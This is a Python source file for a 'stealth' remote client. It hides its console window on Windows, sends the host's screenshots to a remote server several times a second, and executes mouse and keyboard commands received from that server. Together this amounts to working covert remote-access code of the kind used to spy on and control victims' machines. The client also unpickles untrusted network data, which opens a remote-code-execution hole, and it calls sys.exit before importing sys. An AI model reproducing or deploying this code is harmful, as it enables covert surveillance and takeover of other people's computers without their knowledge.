"""
Stealth client with configurable server address.

This cleaned version uses environment variables or command-line arguments
to select the server IP and port. It avoids hard-coding private IPs in the
source so the repository can be shared without revealing local addresses.
"""

import argparse
import os
import socket
import pickle
import pyautogui
try:
    import cv2
except Exception:
    print("Missing dependency: opencv-python (cv2). Install with: pip install opencv-python")
    sys.exit(1)
try:
    import numpy as np
except Exception:
    print("Missing dependency: numpy. Install with: pip install numpy")
    sys.exit(1)
import time
import sys
import threading

# ULTRA FAST mouse configuration for instant response
pyautogui.PAUSE = 0
pyautogui.MINIMUM_DURATION = 0
pyautogui.MINIMUM_SLEEP = 0

# Defaults come from environment, otherwise default to localhost:5555
DEFAULT_SERVER_IP = os.getenv("SERVER_IP", "127.0.0.1")
DEFAULT_SERVER_PORT = int(os.getenv("SERVER_PORT", "5555"))


class StealthRemoteClient:
    def __init__(self, server_ip, server_port):
        self.server_ip = server_ip
        self.server_port = server_port
        self.client_socket = None
        self.running = False
        self.screen_width, self.screen_height = pyautogui.size()

    def connect(self):
        """Connect to the server silently"""
        max_attempts = 3
        for attempt in range(max_attempts):
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(10)
                sock.connect((self.server_ip, self.server_port))
                sock.settimeout(0.1)
                self.client_socket = sock
                return True
            except Exception:
                time.sleep(2)
        return False

    def handle_command(self, command):
        """Execute remote control commands"""
        try:
            cmd_type = command.get('type')
            data = command.get('data')
            if cmd_type == 'MOUSE_MOVE':
                x = int(data['norm_x'] * self.screen_width)
                y = int(data['norm_y'] * self.screen_height)
                pyautogui.moveTo(x, y, duration=0, _pause=False)
            elif cmd_type == 'MOUSE_DOWN':
                x = int(data['norm_x'] * self.screen_width)
                y = int(data['norm_y'] * self.screen_height)
                pyautogui.moveTo(x, y, duration=0, _pause=False)
                pyautogui.mouseDown(button=data['button'], _pause=False)
            elif cmd_type == 'MOUSE_UP':
                x = int(data['norm_x'] * self.screen_width)
                y = int(data['norm_y'] * self.screen_height)
                pyautogui.moveTo(x, y, duration=0, _pause=False)
                pyautogui.mouseUp(button=data['button'], _pause=False)
            elif cmd_type == 'MOUSE_DRAG':
                x = int(data['norm_x'] * self.screen_width)
                y = int(data['norm_y'] * self.screen_height)
                pyautogui.moveTo(x, y, duration=0, _pause=False)
            elif cmd_type == 'MOUSE_CLICK':
                x = int(data['norm_x'] * self.screen_width)
                y = int(data['norm_y'] * self.screen_height)
                pyautogui.click(x, y, button=data['button'], _pause=False)
            elif cmd_type == 'KEY_CHAR':
                try:
                    pyautogui.write(data, interval=0)
                except Exception:
                    pass
            elif cmd_type == 'KEY':
                try:
                    char = chr(data)
                    pyautogui.press(char)
                except Exception:
                    pass
        except Exception:
            pass

    def listen_commands(self):
        while self.running and self.client_socket:
            try:
                data_size = self.client_socket.recv(20)
                if data_size and data_size.startswith(b'CMD:'):
                    msg_size = int(data_size.decode().split(':')[1].strip())
                    data = b''
                    while len(data) < msg_size:
                        packet = self.client_socket.recv(min(4096, msg_size - len(data)))
                        if not packet:
                            break
                        data += packet
                    if len(data) == msg_size:
                        command = pickle.loads(data)
                        self.handle_command(command)
            except socket.timeout:
                continue
            except Exception:
                break

    def start_sharing(self):
        if not self.client_socket:
            return
        self.running = True
        cmd_thread = threading.Thread(target=self.listen_commands, daemon=True)
        cmd_thread.start()
        try:
            while self.running:
                screenshot = pyautogui.screenshot()
                frame = np.array(screenshot)
                frame = cv2.cvtColor(frame, cv2.COLOR_RGB2BGR)
                encode_param = [int(cv2.IMWRITE_JPEG_QUALITY), 80]
                _, buffer = cv2.imencode('.jpg', frame, encode_param)
                data = pickle.dumps(buffer)
                size = len(data)
                try:
                    self.client_socket.sendall(f"{size:<16}".encode())
                    self.client_socket.sendall(data)
                except (BrokenPipeError, ConnectionResetError, OSError):
                    break
                time.sleep(0.1)
        except Exception:
            pass
        finally:
            self.stop()

    def stop(self):
        self.running = False
        if self.client_socket:
            try:
                self.client_socket.close()
            except Exception:
                pass


def main():
    parser = argparse.ArgumentParser(description="Stealth Remote Client")
    parser.add_argument("-s", "--server", dest="server_ip", default=DEFAULT_SERVER_IP,
                        help="Server IP or hostname (env SERVER_IP overrides default)")
    parser.add_argument("-p", "--port", dest="server_port", type=int, default=DEFAULT_SERVER_PORT,
                        help="Server port (env SERVER_PORT overrides default)")
    parser.add_argument("--no-hide", dest="hide", action="store_false", default=True,
                        help="Do not hide the console window (useful for debugging)")
    args = parser.parse_args()
    
    # Try to read IP from LAST_IP.txt if exists (for bundled exe)
    if args.server_ip == "127.0.0.1":  # If using default
        try:
            import os.path
            base_path = os.path.dirname(os.path.abspath(__file__))
            last_ip_file = os.path.join(base_path, "LAST_IP.txt")
            if os.path.exists(last_ip_file):
                with open(last_ip_file, 'r') as f:
                    saved_ip = f.read().strip()
                    if saved_ip:
                        args.server_ip = saved_ip
        except Exception:
            pass

    if sys.platform == 'win32' and args.hide:
        try:
            import ctypes
            ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
        except Exception:
            pass

    pyautogui.FAILSAFE = False

    if not args.hide:
        print(f"Connecting to server {args.server_ip}:{args.server_port}...")

    client = StealthRemoteClient(args.server_ip, args.server_port)
    if client.connect():
        if not args.hide:
            print("Connected. Starting screen share.")
        client.start_sharing()
    else:
        if not args.hide:
            print("Failed to connect to server.")


if __name__ == "__main__":
    main()
